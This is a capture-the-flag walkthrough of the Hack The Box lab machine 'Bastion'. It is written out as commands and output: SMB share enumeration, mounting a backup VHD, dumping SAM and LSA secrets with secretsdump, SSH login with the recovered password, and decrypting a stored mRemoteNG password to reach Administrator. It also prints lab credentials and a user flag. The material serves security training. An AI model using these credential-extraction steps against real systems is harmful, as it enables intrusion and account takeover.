# Bastion
>Author : Xyan1d3
>Date : 12th July 2021
>IP : 10.10.10.134
>OS : Windows
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Mon Jul 12 01:34:57 2021 as: nmap -vvv -p 22,135,139,445,5985,47001,49664,49668,49665,49669,49670,49666,49667 -A -oN nmap/rustscan 10.10.10.134
Nmap scan report for bastion.htb (10.10.10.134)
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2021-07-12 01:34:58 IST for 74s

PORT      STATE SERVICE      REASON          VERSION
22/tcp    open  ssh          syn-ack ttl 127 OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
|_clock-skew: mean: -39m56s, deviation: 1h09m13s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31802/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 26941/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 65355/udp): CLEAN (Timeout)
|   Check 4 (port 18741/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-11T22:06:07+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-11T20:06:05
|_  start_date: 2021-07-11T20:04:09

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   150.73 ms 10.10.16.1
2   224.52 ms bastion.htb (10.10.10.134)
```

We a `22/tcp` or `SSH` on the box which is a little odd as it is windows.

## SMB Enumeration
We do an SMB Null Session Attack and find out that we have a few shares.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion]
└──╼ # smbclient -L \\10.10.10.134
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

We see that we have an unknown share named `Backups` here which we can see if we have access to.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion]
└──╼ # crackmapexec smb 10.10.10.134
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
```

We get into the `Backups` share and list the files inside the share.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion]
└──╼ # smbclient \\\\10.10.10.134\\Backups
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 15:32:11 2019
  ..                                  D        0  Tue Apr 16 15:32:11 2019
  note.txt                           AR      116  Tue Apr 16 15:40:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 18:13:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 18:14:02 2019

                7735807 blocks of size 4096. 2758511 blocks available
```

We have a `note.txt` which reads as follows.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion]
└──╼ # cat note.txt 

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```
On further digging in we find out that we have a `vhd` file which is a virtual harddisk file of windows. And, It is about `5 GB` in size. Therefore, We have to mount this `vhd` file.
```python
smb: \> cd WindowsImageBackup\
smb: \WindowsImageBackup\> ls
  .                                  Dn        0  Fri Feb 22 18:14:02 2019
  ..                                 Dn        0  Fri Feb 22 18:14:02 2019
  L4mpje-PC                          Dn        0  Fri Feb 22 18:15:32 2019

                7735807 blocks of size 4096. 2758511 blocks available
smb: \WindowsImageBackup\> cd L4mpje-PC\
smb: \WindowsImageBackup\L4mpje-PC\> ls
  .                                  Dn        0  Fri Feb 22 18:15:32 2019
  ..                                 Dn        0  Fri Feb 22 18:15:32 2019
  Backup 2019-02-22 124351           Dn        0  Fri Feb 22 18:15:32 2019
  Catalog                            Dn        0  Fri Feb 22 18:15:32 2019
  MediaId                            An       16  Fri Feb 22 18:14:02 2019
  SPPMetadataCache                   Dn        0  Fri Feb 22 18:15:32 2019

                7735807 blocks of size 4096. 2758511 blocks available
smb: \WindowsImageBackup\L4mpje-PC\> ls
  .                                  Dn        0  Fri Feb 22 18:15:32 2019
  ..                                 Dn        0  Fri Feb 22 18:15:32 2019
  Backup 2019-02-22 124351           Dn        0  Fri Feb 22 18:15:32 2019
  Catalog                            Dn        0  Fri Feb 22 18:15:32 2019
  MediaId                            An       16  Fri Feb 22 18:14:02 2019
  SPPMetadataCache                   Dn        0  Fri Feb 22 18:15:32 2019

                7735807 blocks of size 4096. 2758511 blocks available
smb: \WindowsImageBackup\L4mpje-PC\> cd "Backup 2019-02-22 124351"
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls
  .                                  Dn        0  Fri Feb 22 18:15:32 2019
  ..                                 Dn        0  Fri Feb 22 18:15:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 18:14:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 18:15:32 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 18:15:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 18:15:32 2019

                7735807 blocks of size 4096. 2758511 blocks available
```

We First have to mount the smb share on to our device.
![[Pasted image 20210712135431.png]]

Resource : https://www.how2shout.com/linux/mount-virtual-hard-disk-vhd-file-ubuntu-linux/

![[Pasted image 20210712140645.png]]

We can now visit the mouted `vhd` and find out that it is indeed an `C:\` copy of windows.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion/vhdmnt]
└──╼ # ls -l
total 2096729
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 11  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 11  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /sysroot/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 14  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 12  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
```

From, Here We try to get the flags but, unfortunately it does not existed there.

But, We could extract the `SAM`, `SYSTEM` & `SECURITY` files and dump the hashes and try it on the box.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion/vhdmnt/Windows/System32/config]
└──╼ # ls -lh
total 73M
*** SNIP ***
-rwxrwxrwx 1 root root 256K Feb 22  2019 SAM
*** SNIP ***
-rwxrwxrwx 1 root root 256K Feb 22  2019 SECURITY
*** SNIP ***
-rwxrwxrwx 1 root root 9.3M Feb 22  2019 SYSTEM
*** SNIP ***
```

We could do a `secretsdump.py` to dump the hashes of the file.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion/vhdmnt/Windows/System32/config]
└──╼ # secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.9.23.dev1+20210419.165326.f9453d21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up...
```

# Initial FootHold as L4mpje
We get a credential which we could use to `SSH` into the box.

|Username|Password|
|--|--|
|L4mpje|bureaulampje|

```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion/vhdmnt/Windows/System32/config]
└──╼ # ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>whoami
bastion\l4mpje
```

## Getting the user Flag
```python
l4mpje@BASTION C:\Users\L4mpje\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Users\L4mpje\Desktop

22-02-2019  16:27    <DIR>          .
22-02-2019  16:27    <DIR>          ..
23-02-2019  10:07                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  11.298.115.584 bytes free

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
9bfe57d5c3309db3a151772f9d86c6cd
```

# Root Escalation
We could easily escalate to `Administrator` with `Print Nightmare` but, we will be doing it in the intended way which is the program installed called `mRemoteNG`.

```python
l4mpje@BASTION C:\Program Files (x86)>dir     
 Volume in drive C has no label.              
 Volume Serial Number is 0CB3-C487            

 Directory of C:\Program Files (x86)          

22-02-2019  15:01    <DIR>          .         
22-02-2019  15:01    <DIR>          ..        
16-07-2016  15:23    <DIR>          Common Files
23-02-2019  10:38    <DIR>          Internet Explorer
16-07-2016  15:23    <DIR>          Microsoft.NET
22-02-2019  15:01    <DIR>          mRemoteNG 
23-02-2019  11:22    <DIR>          Windows Defender
23-02-2019  10:38    <DIR>          Windows Mail
23-02-2019  11:22    <DIR>          Windows Media Player
16-07-2016  15:23    <DIR>          Windows Multimedia Platform
16-07-2016  15:23    <DIR>          Windows NT
23-02-2019  11:22    <DIR>          Windows Photo Viewer
16-07-2016  15:23    <DIR>          Windows Portable Devices
16-07-2016  15:23    <DIR>          WindowsPowerShell                                   
               0 File(s)              0 bytes 
              14 Dir(s)  11.298.115.584 bytes free
```

We could now, check on Appdata for file related to this software.
```python
PS C:\Users\L4mpje\AppData\Roaming\mRemoteNG> dir


    Directory: C:\Users\L4mpje\AppData\Roaming\mRemoteNG


Mode                LastWriteTime         Length Name                                   
----                -------------         ------ ----                                   
d-----        22-2-2019     14:01                Themes
-a----        22-2-2019     14:03           6316 confCons.xml
-a----        22-2-2019     14:02           6194 confCons.xml.20190222-1402277353.backup
-a----        22-2-2019     14:02           6206 confCons.xml.20190222-1402339071.backup
-a----        22-2-2019     14:02           6218 confCons.xml.20190222-1402379227.backup
-a----        22-2-2019     14:02           6231 confCons.xml.20190222-1403070644.backup
-a----        22-2-2019     14:03           6319 confCons.xml.20190222-1403100488.backup
-a----        22-2-2019     14:03           6318 confCons.xml.20190222-1403220026.backup
-a----        22-2-2019     14:03           6315 confCons.xml.20190222-1403261268.backup
-a----        22-2-2019     14:03           6316 confCons.xml.20190222-1403272831.backup
-a----        22-2-2019     14:03           6315 confCons.xml.20190222-1403433299.backup
-a----        22-2-2019     14:03           6316 confCons.xml.20190222-1403486580.backup
-a----        22-2-2019     14:03             51 extApps.xml
-a----        22-2-2019     14:03           5217 mRemoteNG.log
-a----        22-2-2019     14:03           2245 pnlLayout.xml
```

We could use a tool to decrypt the hashes of the `confCons.xml`.
![[Pasted image 20210712162810.png]]

We use this tool https://github.com/haseebT/mRemoteNG-Decrypt to decrypt the hash.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/bastion]
└──╼ # python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
```

We could now use the credential to `SSH` into the box as `Administrator`.
![[Pasted image 20210712163045.png]]

## Getting the root Flag
```python
administrator@BASTION C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Users\Administrator\Desktop

23-02-2019  10:40    <DIR>          .
23-02-2019  10:40    <DIR>          ..
23-02-2019  10:07                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  11.288.547.328 bytes free
```
